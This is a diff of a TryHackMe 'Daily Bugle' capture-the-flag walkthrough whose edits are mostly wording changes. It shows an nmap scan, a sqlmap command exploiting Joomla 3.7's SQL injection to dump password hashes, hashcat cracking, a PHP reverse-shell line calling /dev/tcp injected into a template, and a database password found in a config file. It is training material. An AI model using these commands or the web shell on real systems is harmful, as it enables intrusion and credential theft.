@@ -17,11 +17,11 @@ This [Try Hack Me box](https://tryhackme.com/room/dailybugle) features mainly SQ
 
 ## Ports and Services
 
-We start we the usual ports scanning:
+We start with the usual ports scanning:
 ```bash
 export target=10.10.175.125
 nmap $target -p- -A -oN tcp_ports.txt
-sudo nmap $target -sU -oN udp_ports.txt
+sudo nmap $target -sU -A -oN udp_ports.txt
 ```
 
 From the results:
@@ -48,7 +48,7 @@ we learn a bunch of things. Mainly, that there is a [Joomla! CMS instance](https
 
 ## Port 80/tcp
 
-To get Joomla's version one can read the `README.txt` or use [OWASP Joomscan](https://github.com/OWASP/joomscan) :
+To get Joomla's version we can read the `/README.txt` or use [OWASP Joomscan](https://github.com/OWASP/joomscan) :
 ```bash
 curl $target/README.txt
 ```
@@ -67,7 +67,8 @@ This is **Joomla 3.7**.
 # Low Level Access
 
 ## SQLi
-This particular Joomla version is subject to an [SQL injection vulnerability](https://www.exploit-db.com/exploits/42033). One can exploit it with [sqlmap](http://sqlmap.org/) to get a password hash:
+
+This particular Joomla version is subject to an [SQL injection vulnerability](https://www.exploit-db.com/exploits/42033). We can exploit it with [sqlmap](http://sqlmap.org/) to get a password hash:
 ```bash
 sqlmap -u "http://$target/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' --dump -C username,password
 ```
@@ -78,7 +79,7 @@ For manual exploitation of this blind SQLi, see [hack3rman's considerations](htt
 
 ## Hash cracking
 
-One can identify the hash using [haiti](https://noraj.github.io/haiti/#/):
+We can identify the hash using [haiti](https://noraj.github.io/haiti/#/):
 ```bash
 echo $2y$[OBFUSCATED] > hash
 haiti $(cat hash)
@@ -90,7 +91,7 @@ bcrypt [HC: 3200] [JtR: bcrypt]
 ```
 **bcrypt** format  is confirmed by looking at [hashcat's wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).
 
-Then one crack it with [hashcat](https://hashcat.net):
+Then we crack it with [hashcat](https://hashcat.net):
 ```bash
 export dict=/usr/share/wordlists/rockyou.txt
 hashcat -m 3200 hash $dict
@@ -99,14 +100,14 @@ hashcat -m 3200 hash $dict
 
 ## Shell
 
-Now that we have credentials one can log in Joomla's administrator panel located at `http://$target/administrator/` and navigate to Joomla's defaut template to inject shell code into `/index.php`, namely:
+Now that we have credentials we can log in Joomla's administrator panel located at `http://$target/administrator/` and navigate to Joomla's defaut template to inject shell code into `/index.php`, namely:
 ```php
 shell_exec("/bin/bash -i >& /dev/tcp/10.11.31.164/443 0>&1");
 ```
 See below:
 ![shell code in a PHP file]({{ "/assets/img/daily-bugle-shell-code.png"| absolute_url }})
 
-After having set up a netcat listener  and triggered the shell with `curl $target` one gets a command line as the user `www-data`:
+After having set up a netcat listener  and triggered the shell with `curl $target` we get a command line as the user `www-data`:
 ![a shell as www-data]({{ "/assets/img/daily-bugle-shell.png" | absolute_url }})
 
 Before proceeding to privilege escalation, let's enhance the shell:
@@ -122,7 +123,7 @@ see [ropnop's blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-int
 
 ## Escalating to jjameson user
 
-Doing the usual password mining, one can find the following lines in the file `/var/www/html/configuration.php`:
+Doing the usual password mining, we can find the following lines in the file `/var/www/html/configuration.php`:
 ```php
 public $user = 'root';
 public $password = 'nv5uz9r3ZEDzVjNu';
